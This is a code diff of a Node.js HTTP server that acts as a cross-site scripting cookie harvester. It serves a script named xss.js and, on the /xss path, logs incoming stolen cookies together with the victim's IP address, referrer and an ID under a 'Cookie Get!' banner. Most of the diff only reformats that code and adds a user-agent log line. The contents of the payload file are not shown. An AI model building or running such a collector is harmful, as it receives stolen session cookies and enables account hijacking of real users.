@@ -18,58 +18,61 @@ function formatDate(date, style){
 	return style.replace('yyyy', y).replace('MM', M).replace('dd', d).replace('hh', h).replace('mm', m).replace('ss', s);
 };
 
+function logOut(logContent){
 
+};
 
 
 
 function start(route) {
 	function onRequest(request, response) {
-	var pathname = request.url;
-	pathname = url.parse(request.url).pathname;
-	if(pathname === "/favicon.ico")
-	{
-		var file_ = fs.readFileSync("./ocr_pi.png" , "binary");
-		response.writeHead(200,{'Content-Type': 'image/png'});
-		response.write(file_,"binary");
-		response.end();
-		return;
-	}
-	else if(pathname === "/xss")
-	{
-		requrl = request.url;
-		args = url.parse(request.url,true).query;
-		console.log("\n|Cookie Get! "+formatDate(new Date,"yyyy-MM-dd hh:mm:ss")+"|");
-		console.log("Source:	"+getClientIp(request));
-		console.log("Refer:	"+requrl);
-		console.log("ID:	"+args.id);
-		console.log("Cookie:");
-		console.log(args.cookie);
-		console.log("|Get end.|\n")
-	}
-	else if(pathname === "/xss.js")
-	{
-		console.log("Received "+getClientIp(request)+" requesting for: "+pathname);
-		var file_ =  fs.readFileSync("./xss.js", "utf-8");
-		response.writeHead(200, {'Content-Type': 'text/javascript'});
-		response.write(file_, "utf-8");
-		response.end();
-		return;
-	}
-	else
-	{	
-		console.log("Received "+getClientIp(request)+" requesting for: "+pathname);
-	}
+		var responContent = "";
+		var pathname = url.parse(request.url).pathname;
+		if(pathname === "/favicon.ico")
+		{
+			var file_ = fs.readFileSync("./ocr_pi.png" , "binary");
+			response.writeHead(200,{'Content-Type': 'image/png'});
+			response.write(file_,"binary");
+			response.end();
+			return;
+		}
+		else if(pathname === "/xss")
+		{
+			requrl = request.url;
+			args = url.parse(request.url,true).query;
+			console.log("\n|Cookie Get! "+formatDate(new Date,"yyyy-MM-dd hh:mm:ss")+"|");
+			console.log("Source:	"+getClientIp(request));
+			console.log("Refer:	"+requrl);
+			console.log("ID:	"+args.id);
+			console.log("Cookie:");
+			console.log(args.cookie);
+			console.log("|Get end.|\n")
+		}
+		else if(pathname === "/xss.js")
+		{
+			console.log("Received "+getClientIp(request)+" requesting for: "+pathname);
+			var file_ =  fs.readFileSync("./xss.js", "utf-8");
+			response.writeHead(200, {'Content-Type': 'text/javascript'});
+			response.write(file_, "utf-8");
+			response.end();
+			return;
+		}
+		else
+		{	
+			console.log("Received "+getClientIp(request)+" requesting for: "+pathname);
+			console.log("UA:	"+request.headers['user-agent']);
+		}
 
-	function getClientIp(req) {
-		return req.headers['x-forwarded-for'] ||
-		req.connection.remoteAddress ||
-		req.socket.remoteAddress ||
-		req.connection.socket.remoteAddress;
-    };
+		function getClientIp(req) {
+			return req.headers['x-forwarded-for'] ||
+			req.connection.remoteAddress ||
+			req.socket.remoteAddress ||
+			req.connection.socket.remoteAddress;
+	    };
 
 
-	response.writeHead(200,{'Content-Type': 'text/plain'});
-	response.end("Hi! \n;D");
+		response.writeHead(200,{'Content-Type': 'text/plain'});
+		response.end("Hi! \n;D");
 
 	
 	}
